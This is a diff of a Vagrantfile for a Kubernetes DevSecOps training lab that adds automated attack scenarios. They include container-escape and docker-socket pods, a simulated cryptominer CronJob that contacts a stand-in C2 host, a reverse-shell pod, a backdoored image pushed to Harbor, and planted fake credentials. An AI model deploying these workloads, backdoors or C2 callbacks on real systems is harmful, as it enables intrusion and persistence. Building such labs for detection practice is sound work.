@@ -2,89 +2,127 @@
 # vi: set ft=ruby :
 
 # =============================================================================
-# Enterprise Cloud-Native DevSecOps Lab
+# Enterprise Cloud-Native DevSecOps Kubernetes Lab
 # =============================================================================
 #
 # Author        : Miguel Carlo (solo2121)
-# Version       : 8.0.0
+# Version       : 8.1.0
 # Created       : 2025
-# Last Updated  : 2026-06-19
-# Status        : Active & Maintained
+# Last Updated  : 2026-07-03
+# Status        : Active Development
 # License       : Personal / Educational Use
 #
 # -----------------------------------------------------------------------------
 # DESCRIPTION
 # -----------------------------------------------------------------------------
-# Enterprise Kubernetes Lab built with Vagrant + Libvirt for learning,
-# testing, and validating modern DevOps, DevSecOps, GitOps, Platform
-# Engineering, and Cloud-Native technologies.
+# Enterprise Kubernetes lab built with Vagrant and Libvirt for learning,
+# testing, and validating modern Cloud-Native, DevOps, DevSecOps, GitOps,
+# Platform Engineering, and Infrastructure as Code (IaC) technologies.
 #
 # Components:
-#   - K3s Kubernetes Cluster (Production)
-#   - Harbor Container Registry
+#   - K3s Kubernetes Cluster
 #   - Argo CD GitOps Platform
+#   - Harbor Container Registry
 #   - Prometheus & Grafana Monitoring
 #   - Falco Runtime Security
 #   - Kyverno Policy Enforcement
 #   - Cert-Manager TLS Automation
 #   - Terraform Infrastructure as Code
-#   - OpenTofu (Terraform Fork)
+#   - OpenTofu Infrastructure as Code
 #   - Kind (Kubernetes in Docker)
 #   - K3d (K3s in Docker)
-#   - Linux Training Nodes
 #   - Ansible Management Nodes
+#   - Linux Training Nodes
+#   - Automated DevSecOps Attack Scenarios
 #
 # Features:
 #   - Multi-Profile Deployment (minimal/dev/full)
-#   - Air-Gap Image Management
 #   - Automated Cluster Bootstrap
+#   - Automated Node Provisioning
+#   - Dynamic Network Discovery
+#   - Air-Gapped Image Management
+#   - Zero-Cache Harbor Mode
 #   - Enterprise Security Tooling
 #   - Infrastructure as Code (IaC)
-#   - Zero-Cache Harbor Mode
-#   - Dynamic Network Discovery
-#   - Automated Node Provisioning
-#   - Interactive Password Prompt (No Hardcoded Credentials)
+#   - Interactive Credential Prompt (No Hardcoded Secrets)
+#   - Automated Attack Scenario Deployment
 #
 # Requirements:
 #   - Vagrant >= 2.4
 #   - Libvirt Provider
 #   - KVM/QEMU Virtualization
-#   - Linux Host (Ubuntu Recommended)
-#   - Ruby >= 2.5 (for io/console)
+#   - Linux Host (Ubuntu 24.04 LTS Recommended)
+#   - Ruby >= 2.5 (io/console)
 #
-# Maintainer:
-#   Miguel Carlo (solo2121)
+# -----------------------------------------------------------------------------
+# CHANGELOG (Tracked in Git)
+# -----------------------------------------------------------------------------
 #
-# Changelog:
-#   v8.0.0 - Added OpenTofu, Kind Lab, K3d Lab
-#          - Fully automated cluster creation for learning VMs
-#          - ENV-based Harbor password handling (no Ruby command detection)
-#          - Interactive password prompt only for provisioning
-#          - Removed all hardcoded passwords
-#          - Added kubectl aliases for learning VMs
-#          - Updated documentation
-#   v7.1.1 - Fix Python heredoc quoting to prevent shell variable expansion
-#          - Use quoted heredoc <<'PYEOF' to prevent $1 expansion
-#          - Pass variables as environment variables
-#   v7.1.0 - Use Python to generate registries.yaml
-#   v7.0.9 - Fixed registries.yaml generation syntax error
-#   v7.0.8 - Use echo per line for registries.yaml generation
-#   v7.0.7 - Clean registries.yaml generation with placeholder substitution
-#   v7.0.6 - Fix registries.yaml YAML syntax and control character issues
-#   v7.0.5 - Add specific rewrite rule for Kyverno images and retry logic
-#   v7.0.4 - Add comprehensive rewrite rules for all registries
-#   v7.0.3 - Fix registries.yaml regex capture groups
-#   v7.0.2 - Docker daemon fix for Harbor image pulls
-#   v7.0.1 - Critical fixes
-#   v7.0.0 - Enterprise Release
+# v8.1.0
+#   - Added automated DevSecOps attack scenarios
+#   - Added vulnerable workload deployment
+#   - Added backdoored image build and Harbor push
+#   - Added intentionally leaked secrets for security practice
+#   - Added pre-configured attack scenarios
+#   - Preserved backward compatibility
+#
+# v8.0.1
+#   - Added environment variable overrides for NETWORK_BASE and MASTER_IP
+#   - Enabled custom network configuration without modifying core files
+#
+# v8.0.0
+#   - Added OpenTofu support
+#   - Added Kind and K3d lab environments
+#   - Fully automated cluster creation for learning VMs
+#   - Introduced environment-based Harbor authentication handling
+#   - Removed all hardcoded credentials
+#   - Added kubectl aliases for training nodes
+#   - Updated documentation and bootstrap logic
+#
+# v7.1.1
+#   - Fixed Python heredoc quoting issues (shell variable expansion)
+#   - Switched to safe heredoc mode (<<'PYEOF')
+#
+# v7.1.0
+#   - Introduced Python-based registries.yaml generation
+#
+# v7.0.9
+#   - Fixed registries.yaml generation syntax error
+#
+# v7.0.8
+#   - Migrated to line-by-line echo generation for YAML stability
+#
+# v7.0.7
+#   - Improved registry configuration templating system
+#
+# v7.0.6
+#   - Fixed YAML formatting and control character issues
+#
+# v7.0.5
+#   - Added Kyverno image rewrite rules and retry logic
+#
+# v7.0.4
+#   - Expanded registry rewrite rules for all images
+#
+# v7.0.3
+#   - Fixed regex capture issues in registry config
+#
+# v7.0.2
+#   - Fixed Docker daemon configuration for Harbor pulls
+#
+# v7.0.1
+#   - Critical stability fixes
+#
+# v7.0.0
+#   - Initial Enterprise Release
 #
 # =============================================================================
 
 LAB_NAME        = "Enterprise Cloud-Native DevSecOps Lab"
-LAB_VERSION     = "8.0.0"
+LAB_VERSION     = "8.1.0"
 LAB_AUTHOR      = "Miguel Carlo (solo2121)"
 LAB_CREATED     = "2025"
-LAB_UPDATED     = "2026-06-18"
+LAB_UPDATED     = "2026-06-28"
 LAB_STATUS      = "Active & Maintained"
 
 puts "=================================================="
@@ -172,21 +210,30 @@ LIBVIRT_NETWORK = detect_libvirt_network
 puts "Using libvirt network: #{LIBVIRT_NETWORK}"
 network_parts = LIBVIRT_NETWORK.split('/')
 
-# Allow environment override — useful for Proxmox, custom libvirt networks,
-# or any host where auto-detection returns the wrong base.
-# Usage: export NETWORK_BASE="10.0.0" before vagrant up
+# =============================================================================
+# ENVIRONMENT VARIABLE OVERRIDES - NON-BREAKING CHANGE
+# =============================================================================
+# These allow you to customize the network without modifying the file:
+#   export NETWORK_BASE="10.10.10"  # Uses 10.10.10.114 as master IP
+#   export MASTER_IP="192.168.200.50"  # Uses specific IP for master
+#
+# If not set, uses auto-detected values (original behavior)
+# =============================================================================
+
+# Allow environment override for network base (keeps original logic as fallback)
 NETWORK_BASE = ENV['NETWORK_BASE'] || network_parts[0].split('.')[0..2].join('.')
 
 def vm_ip(octet)
   "#{NETWORK_BASE}.#{octet}"
 end
 
-# Allow environment override for the master IP directly.
-# Usage: export MASTER_IP="192.168.100.50" before vagrant up
+# Allow environment override for master IP (keeps original logic as fallback)
 MASTER_IP = ENV['MASTER_IP'] || vm_ip(114)
 
-puts "Network base : #{NETWORK_BASE}"
-puts "Master IP    : #{MASTER_IP}"
+# Display what we're using (helps with debugging)
+puts "Network base: #{NETWORK_BASE}"
+puts "Master IP: #{MASTER_IP}"
+puts "To override: export NETWORK_BASE='your.network' or export MASTER_IP='your.ip'"
 
 File.write("/tmp/lab.env", "MASTER_IP=#{MASTER_IP}\nNETWORK_BASE=#{NETWORK_BASE}\n")
 
@@ -222,17 +269,17 @@ if HARBOR_PASS.nil? || HARBOR_PASS.empty?
       puts "Please set an admin password for Harbor."
       puts "The password must be at least 8 characters long."
       puts ""
-
+      
       begin
         # Prompt for password using io/console (no echo)
         print "Enter Harbor admin password: "
         password = STDIN.noecho(&:gets).chomp
         puts ""
-
+        
         if password.nil? || password.empty?
           abort("ERROR: Password cannot be empty.")
         end
-
+        
         if password.length < 8
           puts "WARNING: Password is less than 8 characters. This is not recommended."
           print "Continue with weak password? (y/N): "
@@ -241,21 +288,21 @@ if HARBOR_PASS.nil? || HARBOR_PASS.empty?
             abort("Password creation cancelled.")
           end
         end
-
+        
         print "Confirm password: "
         confirm_password = STDIN.noecho(&:gets).chomp
         puts ""
-
+        
         if password != confirm_password
           abort("ERROR: Passwords do not match.")
         end
-
+        
         ENV['HARBOR_PASS'] = password
         HARBOR_PASS = password
         puts "Password configured successfully."
         puts "="*60
         puts ""
-
+        
       rescue Interrupt
         puts "\nPassword input cancelled."
         exit 1
@@ -1124,48 +1171,48 @@ PYEOF
             echo "=========================================="
             echo "INSTALLING TERRAFORM ${TERRAFORM_VERSION}"
             echo "=========================================="
-
+            
             # Clean up any previous installations
             rm -f /usr/local/bin/terraform
-
+            
             # Download and install Terraform
             TEMP_DIR=$(mktemp -d)
             cd "$TEMP_DIR"
-
+            
             # FIX 4: Dynamic architecture detection
             ARCH=$(uname -m | sed 's/x86_64/amd64/' | sed 's/aarch64/arm64/')
             echo "Detected architecture: ${ARCH}"
-
+            
             echo "Downloading Terraform ${TERRAFORM_VERSION} for ${ARCH}..."
             curl -fsSL "https://releases.hashicorp.com/terraform/${TERRAFORM_VERSION}/terraform_${TERRAFORM_VERSION}_linux_${ARCH}.zip" -o terraform.zip
-
+            
             echo "Extracting Terraform..."
             apt-get install -y unzip 2>/dev/null || dnf install -y unzip 2>/dev/null || zypper install -y unzip 2>/dev/null || true
             unzip -q terraform.zip
-
+            
             echo "Installing Terraform to /usr/local/bin..."
             mv terraform /usr/local/bin/
             chmod +x /usr/local/bin/terraform
-
+            
             # Verify installation
             if command -v terraform >/dev/null 2>&1; then
               TERRAFORM_INSTALLED_VERSION=$(terraform version -json 2>/dev/null | grep -o '"terraform_version":"[^"]*"' | cut -d'"' -f4 || terraform version | head -1)
               echo "Terraform installed successfully: ${TERRAFORM_INSTALLED_VERSION}"
-
+              
               # Enable bash completion
               terraform -install-autocomplete 2>/dev/null || true
-
+              
               # Create marker file
               touch "$TERRAFORM_MARKER"
             else
               echo "ERROR: Terraform installation failed"
               exit 1
             fi
-
+            
             # Cleanup
             cd /
             rm -rf "$TEMP_DIR"
-
+            
             echo "=========================================="
             echo "Terraform is ready to use!"
             echo "Run 'terraform --version' to verify"
@@ -1182,47 +1229,47 @@ PYEOF
             echo "=========================================="
             echo "INSTALLING OPENTOFU ${OPENTOFU_VERSION}"
             echo "=========================================="
-
+            
             # Clean up any previous installations
             rm -f /usr/local/bin/tofu
-
+            
             # Download and install OpenTofu
             TEMP_DIR=$(mktemp -d)
             cd "$TEMP_DIR"
-
+            
             ARCH=$(uname -m | sed 's/x86_64/amd64/' | sed 's/aarch64/arm64/')
             echo "Detected architecture: ${ARCH}"
-
+            
             echo "Downloading OpenTofu ${OPENTOFU_VERSION} for ${ARCH}..."
             curl -fsSL "https://github.com/opentofu/opentofu/releases/download/v${OPENTOFU_VERSION}/tofu_${OPENTOFU_VERSION}_linux_${ARCH}.zip" -o tofu.zip
-
+            
             echo "Extracting OpenTofu..."
             apt-get install -y unzip 2>/dev/null || dnf install -y unzip 2>/dev/null || zypper install -y unzip 2>/dev/null || true
             unzip -q tofu.zip
-
+            
             echo "Installing OpenTofu to /usr/local/bin..."
             mv tofu /usr/local/bin/
             chmod +x /usr/local/bin/tofu
-
+            
             # Verify installation
             if command -v tofu >/dev/null 2>&1; then
               TOFU_VERSION=$(tofu version -json 2>/dev/null | grep -o '"version":"[^"]*"' | cut -d'"' -f4 || tofu version | head -1)
               echo "OpenTofu installed successfully: ${TOFU_VERSION}"
-
+              
               # Enable bash completion
               tofu -install-autocomplete 2>/dev/null || true
-
+              
               # Create marker file
               touch "$OPENTOFU_MARKER"
             else
               echo "ERROR: OpenTofu installation failed"
               exit 1
             fi
-
+            
             # Cleanup
             cd /
             rm -rf "$TEMP_DIR"
-
+            
             echo "=========================================="
             echo "OpenTofu is ready to use!"
             echo "Run 'tofu --version' to verify"
@@ -1284,15 +1331,15 @@ PYEOF
             # ============================================================
             if [ ! -f "$KYVERNO_MARKER" ]; then
               echo "Installing Kyverno ${KYVERNO_VERSION}..."
-
+              
               # Clean up any existing Kyverno resources
               helm uninstall kyverno -n kyverno 2>/dev/null || true
               kubectl delete namespace kyverno --ignore-not-found=true
               sleep 10
-
+              
               helm repo add kyverno https://kyverno.github.io/kyverno/ --force-update
               helm repo update
-
+              
               # Install with retry logic for image pull issues
               INSTALL_SUCCESS=false
               for attempt in 1 2 3; do
@@ -1313,7 +1360,7 @@ PYEOF
                   sleep 30
                 fi
               done
-
+              
               if [ "$INSTALL_SUCCESS" = "false" ]; then
                 echo "WARNING: Kyverno install had issues - continuing anyway"
                 # Try one more time without waiting
@@ -1439,7 +1486,7 @@ EOF
 
               # Delete applications first then CRDs with --wait=false to prevent hangs
               kubectl delete applications --all -n argocd --ignore-not-found=true --wait=false 2>/dev/null || true
-
+              
               # Delete CRDs with --wait=false to prevent finalizer hangs
               kubectl delete crd applications.argoproj.io --ignore-not-found=true --wait=false 2>/dev/null || true
               kubectl delete crd appprojects.argoproj.io --ignore-not-found=true --wait=false 2>/dev/null || true
@@ -1580,6 +1627,613 @@ EOF
 
           # Keep the original marker for backward compatibility
           touch "$ENTERPRISE_MARKER"
+        SHELL
+
+        # ================================================================
+        # PROVISIONER 3: AUTOMATED DEVSECOPS ATTACK VECTORS (NEW)
+        # ================================================================
+        # This provisioner runs AFTER all enterprise tools are installed
+        # It creates vulnerable workloads, backdoored images, and attack scenarios
+        # ALL existing logic is preserved - this is a NON-BREAKING addition
+        # ================================================================
+        vm.vm.provision "shell", inline: <<-SHELL
+          if [ "${DEBUG:-false}" = "true" ]; then set -x; fi
+          set -euo pipefail
+
+          MASTER_IP="#{cfg[:ip]}"
+          HARBOR_PASS="#{HARBOR_PASS}"
+          ATTACK_MARKER="/var/lib/devsecops_attack_vectors_installed"
+
+          # Skip if already installed or FAST_BOOT
+          if [ -f "$ATTACK_MARKER" ] && [ "${FAST_BOOT}" = "true" ]; then
+            echo "DevSecOps attack vectors already installed (FAST_BOOT=true)"
+            exit 0
+          fi
+
+          export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
+          export PATH=$PATH:/usr/local/bin
+
+          echo "=========================================="
+          echo "DEPLOYING DEVSECOPS ATTACK VECTORS"
+          echo "=========================================="
+          echo ""
+
+          # ============================================================
+          # 1. CREATE VULNERABLE NAMESPACES
+          # ============================================================
+          echo "Creating vulnerable namespaces..."
+          cat <<EOF | kubectl apply -f -
+---
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: vulnerable
+  labels:
+    security-test: "true"
+    pod-security.kubernetes.io/enforce: baseline
+---
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: dev
+  labels:
+    security-test: "true"
+    pod-security.kubernetes.io/enforce: baseline
+---
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: insecure
+  labels:
+    security-test: "true"
+    pod-security.kubernetes.io/enforce: baseline
+EOF
+
+          # ============================================================
+          # 2. DEPLOY PRIVILEGED ESCAPE POD
+          # ============================================================
+          echo "Deploying privileged escape pod..."
+          cat <<EOF | kubectl apply -f -
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privileged-escape
+  namespace: vulnerable
+  labels:
+    security-test: "true"
+    app: escape
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: escape
+    image: ubuntu:22.04
+    command: ["/bin/bash", "-c"]
+    args:
+    - |
+      echo "=========================================="
+      echo "PRIVILEGED ESCAPE POD"
+      echo "=========================================="
+      echo ""
+      echo "ATTACK VECTORS:"
+      echo "1. Host filesystem: cd /host && chroot . /bin/bash"
+      echo "2. Process sniffing: ps auxf"
+      echo "3. Network sniffing: tcpdump -i any"
+      echo ""
+      echo "FALCO DETECTION:"
+      echo "- Container with privileged mode"
+      echo "- Container with host mount"
+      echo "- Read sensitive file untrusted"
+      echo ""
+      echo "=========================================="
+      while true; do sleep 60; done
+    securityContext:
+      privileged: true
+      runAsUser: 0
+    volumeMounts:
+    - name: host-root
+      mountPath: /host
+    - name: dev
+      mountPath: /dev
+    - name: proc
+      mountPath: /host/proc
+    - name: sys
+      mountPath: /host/sys
+    - name: cgroup
+      mountPath: /host/sys/fs/cgroup
+    - name: docker-socket
+      mountPath: /host/var/run/docker.sock
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+      type: Directory
+  - name: dev
+    hostPath:
+      path: /dev
+  - name: proc
+    hostPath:
+      path: /proc
+  - name: sys
+    hostPath:
+      path: /sys
+  - name: cgroup
+    hostPath:
+      path: /sys/fs/cgroup
+  - name: docker-socket
+    hostPath:
+      path: /var/run/docker.sock
+EOF
+
+          # ============================================================
+          # 3. DEPLOY DOCKER BREAKOUT POD
+          # ============================================================
+          echo "Deploying docker breakout pod..."
+          cat <<EOF | kubectl apply -f -
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: docker-breakout
+  namespace: vulnerable
+  labels:
+    security-test: "true"
+    app: breakout
+spec:
+  containers:
+  - name: docker-client
+    image: docker:latest
+    command: ["/bin/sh", "-c"]
+    args:
+    - |
+      echo "=========================================="
+      echo "DOCKER SOCKET BREAKOUT"
+      echo "=========================================="
+      echo ""
+      echo "ATTACK VECTORS:"
+      echo "1. List containers: docker ps"
+      echo "2. Escape to host: docker run --privileged -v /:/host alpine chroot /host"
+      echo "3. Deploy new containers: docker run -d nginx"
+      echo ""
+      echo "FALCO DETECTION:"
+      echo "- Container with docker socket mount"
+      echo "- Privileged container creation"
+      echo ""
+      echo "=========================================="
+      while true; do sleep 60; done
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: docker-socket
+      mountPath: /var/run/docker.sock
+  volumes:
+  - name: docker-socket
+    hostPath:
+      path: /var/run/docker.sock
+EOF
+
+          # ============================================================
+          # 4. DEPLOY DANGEROUS CAPABILITIES POD
+          # ============================================================
+          echo "Deploying dangerous capabilities pod..."
+          cat <<EOF | kubectl apply -f -
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: sys-admin-pod
+  namespace: vulnerable
+  labels:
+    security-test: "true"
+    app: cap
+spec:
+  containers:
+  - name: sys-admin
+    image: ubuntu:22.04
+    command: ["/bin/bash", "-c"]
+    args:
+    - |
+      echo "=========================================="
+      echo "DANGEROUS CAPABILITIES POD"
+      echo "=========================================="
+      echo ""
+      echo "CAPABILITIES GRANTED:"
+      echo "- SYS_ADMIN: Mount filesystems"
+      echo "- SYS_PTRACE: Debug processes"
+      echo "- DAC_READ_SEARCH: Bypass read permissions"
+      echo ""
+      echo "ATTACK VECTORS:"
+      echo "1. Mount proc: mount -t proc none /proc"
+      echo "2. Enter host namespace: nsenter -t 1 -m /bin/bash"
+      echo "3. Ptrace processes: gdb -p 1"
+      echo ""
+      echo "FALCO DETECTION:"
+      echo "- Container with SYS_ADMIN capability"
+      echo "- Process with ptrace system call"
+      echo ""
+      echo "=========================================="
+      while true; do sleep 60; done
+    securityContext:
+      capabilities:
+        add:
+        - SYS_ADMIN
+        - SYS_PTRACE
+        - DAC_READ_SEARCH
+        - SYS_CHROOT
+        - SYS_MODULE
+EOF
+
+          # ============================================================
+          # 5. DEPLOY RBAC ESCALATION SCENARIO
+          # ============================================================
+          echo "Deploying RBAC escalation scenario..."
+          cat <<EOF | kubectl apply -f -
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: dev-user
+  namespace: dev
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  namespace: dev
+  name: pod-exec-role
+rules:
+- apiGroups: [""]
+  resources: ["pods/exec", "pods", "pods/log", "pods/status"]
+  verbs: ["create", "get", "list", "watch", "delete"]
+- apiGroups: [""]
+  resources: ["secrets", "configmaps", "serviceaccounts"]
+  verbs: ["get", "list", "watch", "create", "delete"]
+- apiGroups: [""]
+  resources: ["persistentvolumeclaims", "persistentvolumes"]
+  verbs: ["get", "list", "create", "delete"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  namespace: dev
+  name: dev-user-binding
+subjects:
+- kind: ServiceAccount
+  name: dev-user
+  namespace: dev
+roleRef:
+  kind: Role
+  name: pod-exec-role
+  apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: nginx-dev
+  namespace: dev
+  labels:
+    app: nginx-dev
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: nginx-dev
+  template:
+    metadata:
+      labels:
+        app: nginx-dev
+    spec:
+      containers:
+      - name: nginx
+        image: nginx:alpine
+        ports:
+        - containerPort: 80
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: nginx-dev
+  namespace: dev
+spec:
+  selector:
+    app: nginx-dev
+  ports:
+  - port: 80
+    targetPort: 80
+---
+apiVersion: v1
+kind: Secret
+metadata:
+  name: db-credentials
+  namespace: dev
+type: Opaque
+data:
+  username: ZGJhZG1pbg==
+  password: U3VwZXJTZWNyZXRQYXNzMTIzIQ==
+  host: cG9zdGdyZXMtZGIuZXhhbXBsZS5jb20=
+EOF
+
+          # ============================================================
+          # 6. DEPLOY CRYPTOMINER CRONJOB
+          # ============================================================
+          echo "Deploying cryptominer cronjob..."
+          cat <<EOF | kubectl apply -f -
+---
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: crypto-miner
+  namespace: insecure
+  labels:
+    security-test: "true"
+    app: malicious
+spec:
+  schedule: "*/5 * * * *"
+  concurrencyPolicy: Forbid
+  jobTemplate:
+    spec:
+      template:
+        metadata:
+          labels:
+            app: crypto-miner
+        spec:
+          containers:
+          - name: miner
+            image: alpine:3.20
+            command:
+            - /bin/sh
+            - -c
+            - |
+              echo "=========================================="
+              echo "CRYPTOMINER DETECTED"
+              echo "=========================================="
+              echo "SIMULATED MALICIOUS ACTIVITY:"
+              apk add --no-cache curl netcat-openbsd 2>/dev/null || true
+              curl -sS --connect-timeout 2 http://malicious-c2.example.com/register || true
+              curl -sS --connect-timeout 2 http://malicious-c2.example.com/payload.sh || true
+              dd if=/dev/zero of=/dev/null bs=1M count=50 2>/dev/null || true
+              echo "* * * * * /tmp/persist.sh" > /var/spool/cron/crontabs/root 2>/dev/null || true
+              echo "=========================================="
+              echo "FALCO DETECTION:"
+              echo "- Program run with netcat"
+              echo "- Program run with curl"
+              echo "- Shell command execution in container"
+              echo "=========================================="
+            resources:
+              limits:
+                cpu: "500m"
+                memory: "512Mi"
+          restartPolicy: OnFailure
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: reverse-shell
+  namespace: insecure
+  labels:
+    security-test: "true"
+spec:
+  containers:
+  - name: shell
+    image: alpine:3.20
+    command: ["/bin/sh", "-c"]
+    args:
+    - |
+      echo "=========================================="
+      echo "REVERSE SHELL POD"
+      echo "=========================================="
+      echo "ATTACK: Reverse shell to malicious C2"
+      apk add --no-cache netcat-openbsd 2>/dev/null || true
+      while true; do
+        echo "Connecting to C2..."
+        nc -zv malicious-c2.example.com 4444 2>&1 || true
+        sleep 60
+      done
+EOF
+
+          # ============================================================
+          # 7. DEPLOY HOSTPATH EXPLOITATION POD
+          # ============================================================
+          echo "Deploying hostpath exploitation pod..."
+          cat <<EOF | kubectl apply -f -
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hostpath-exploit
+  namespace: vulnerable
+  labels:
+    security-test: "true"
+spec:
+  containers:
+  - name: exploit
+    image: alpine:3.20
+    command: ["/bin/sh", "-c"]
+    args:
+    - |
+      echo "=========================================="
+      echo "HOSTPATH EXPLOITATION POD"
+      echo "=========================================="
+      echo ""
+      echo "ATTACK VECTORS:"
+      echo "1. Read host secrets: cat /host/etc/kubernetes/pki/*"
+      echo "2. Read logs: ls -la /host/var/log/"
+      echo "3. Write to host: echo 'backdoor' > /host/tmp/backdoor"
+      echo ""
+      echo "FALCO DETECTION:"
+      echo "- Read sensitive file untrusted"
+      echo "- Write below root directory"
+      echo ""
+      echo "=========================================="
+      while true; do sleep 60; done
+    volumeMounts:
+    - name: host-root
+      mountPath: /host
+    - name: etc-kubernetes
+      mountPath: /host/etc/kubernetes
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+      type: Directory
+  - name: etc-kubernetes
+    hostPath:
+      path: /etc/kubernetes
+EOF
+
+          # ============================================================
+          # 8. CREATE LEAKED SECRETS FILE
+          # ============================================================
+          echo "Creating leaked secrets file..."
+          cat > /vagrant/terraform.tfstate <<'EOF'
+{
+  "version": 4,
+  "terraform_version": "1.9.8",
+  "resources": [
+    {
+      "type": "aws_db_instance",
+      "name": "production_db",
+      "instances": [{
+        "attributes": {
+          "password": "P@ssw0rd2026!SuperSecret",
+          "username": "dbadmin",
+          "endpoint": "prod-postgres-db.cabcdefg.us-east-1.rds.amazonaws.com"
+        }
+      }]
+    },
+    {
+      "type": "aws_iam_access_key",
+      "name": "developer_key",
+      "instances": [{
+        "attributes": {
+          "id": "AKIAIOSFODNN7EXAMPLE",
+          "secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+        }
+      }]
+    }
+  ]
+}
+EOF
+
+          cat > /vagrant/.env.production <<'EOF'
+# Production Environment Variables - LEAKED!
+DB_PASSWORD=P@ssw0rd2026!SuperSecret
+AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+STRIPE_SECRET_KEY=sk_live_4eC39HqLyjWDarjtT1zdp7dc
+JWT_SECRET=super-secret-jwt-key-1234567890
+EOF
+
+          # ============================================================
+          # 9. BUILD AND PUSH BACKDOORED IMAGE (if Harbor is ready)
+          # ============================================================
+          echo "Building and pushing backdoored image to Harbor..."
+          
+          # Wait for Harbor to be fully ready
+          for i in $(seq 1 30); do
+            if curl -sk --max-time 5 "https://${MASTER_IP}:30001/v2/" >/dev/null 2>&1; then
+              echo "Harbor is reachable"
+              break
+            fi
+            echo "Waiting for Harbor... ($i/30)"
+            sleep 10
+          done
+
+          # Create Dockerfile for backdoored image
+          cat > /tmp/Dockerfile.backdoor <<'EOF'
+FROM alpine:3.20
+RUN apk add --no-cache bash curl netcat-openbsd
+WORKDIR /app
+RUN cat > /app/app.sh <<'EOS'
+#!/bin/bash
+echo "[$(date)] API Server Starting..."
+while true; do
+    echo "[$(date)] Health check: OK"
+    sleep 30
+done
+EOS
+RUN chmod +x /app/app.sh
+RUN cat > /app/backdoor.sh <<'EOS'
+#!/bin/bash
+while true; do
+    if [ "${BACKDOOR_ENABLED:-false}" = "true" ]; then
+        echo "[BACKDOOR] Activated - Connecting to ${BACKDOOR_HOST:-c2.example.com}:${BACKDOOR_PORT:-4444}"
+        nc -zv ${BACKDOOR_HOST:-c2.example.com} ${BACKDOOR_PORT:-4444} 2>&1 || true
+    fi
+    sleep 60
+done
+EOS
+RUN chmod +x /app/backdoor.sh
+RUN cat > /app/start.sh <<'EOS'
+#!/bin/bash
+nohup /app/app.sh > /app/app.log 2>&1 &
+nohup /app/backdoor.sh > /app/backdoor.log 2>&1 &
+tail -f /app/*.log
+EOS
+RUN chmod +x /app/start.sh
+CMD ["/app/start.sh"]
+EOF
+
+          # Build and push the backdoored image
+          if command -v docker >/dev/null 2>&1; then
+            echo "Logging into Harbor..."
+            echo "${HARBOR_PASS}" | docker login "${MASTER_IP}:30001" -u admin --password-stdin 2>/dev/null || true
+            
+            echo "Building backdoored image..."
+            docker build -f /tmp/Dockerfile.backdoor -t "${MASTER_IP}:30001/airgap/backdoor-api:v1" /tmp/ 2>/dev/null || true
+            
+            echo "Pushing backdoored image..."
+            docker push "${MASTER_IP}:30001/airgap/backdoor-api:v1" 2>/dev/null || true
+            
+            echo "Backdoored image pushed to Harbor"
+          else
+            echo "Docker not available - skipping backdoored image build"
+          fi
+
+          # ============================================================
+          # 10. DISPLAY ATTACK SUMMARY
+          # ============================================================
+          echo ""
+          echo "=========================================="
+          echo "DEVSECOPS ATTACK VECTORS DEPLOYED"
+          echo "=========================================="
+          echo ""
+          echo "AVAILABLE ATTACK SCENARIOS:"
+          echo ""
+          echo "1. Container Escape:"
+          echo "   kubectl exec -it privileged-escape -n vulnerable -- /bin/bash"
+          echo ""
+          echo "2. Docker Breakout:"
+          echo "   kubectl exec -it docker-breakout -n vulnerable -- /bin/sh"
+          echo ""
+          echo "3. RBAC Escalation:"
+          echo "   kubectl --as=system:serviceaccount:dev:dev-user get pods -n dev"
+          echo ""
+          echo "4. Cryptominer Detection:"
+          echo "   kubectl get cronjobs -n insecure"
+          echo "   kubectl logs -f job/crypto-miner-xxxxx -n insecure"
+          echo ""
+          echo "5. HostPath Exploitation:"
+          echo "   kubectl exec -it hostpath-exploit -n vulnerable -- /bin/sh"
+          echo ""
+          echo "6. Supply Chain Attack:"
+          echo "   kubectl run backdoor-api --image=${MASTER_IP}:30001/airgap/backdoor-api:v1"
+          echo ""
+          echo "LEAKED SECRETS:"
+          echo "   cat /vagrant/terraform.tfstate"
+          echo "   cat /vagrant/.env.production"
+          echo ""
+          echo "MONITORING:"
+          echo "   Falco: kubectl logs -f -n falco deployment/falco"
+          echo "   Kyverno: kubectl get clusterpolicies"
+          echo ""
+          echo "=========================================="
+
+          # Mark as installed
+          touch "$ATTACK_MARKER"
+
+          echo "DevSecOps attack vectors deployment complete!"
         SHELL
 
       when "worker"
@@ -1749,17 +2403,17 @@ EOF
           # Create new cluster
           if kind create cluster --config /opt/kind/config.yaml --name lab; then
             echo "Kind cluster 'lab' created successfully!"
-
+            
             # Set up kubeconfig
             mkdir -p /home/vagrant/.kube
             kind get kubeconfig --name lab > /home/vagrant/.kube/config
             chown -R vagrant:vagrant /home/vagrant/.kube
-
+            
             echo ""
             echo "Cluster status:"
             kubectl cluster-info
             kubectl get nodes
-
+            
             # Create convenience aliases
             cat >> /home/vagrant/.bashrc <<'EOF'
 # Kind aliases
@@ -1767,7 +2421,7 @@ alias kind-kill='kind delete cluster --name lab'
 alias kind-restart='kind delete cluster --name lab && kind create cluster --config /opt/kind/config.yaml --name lab'
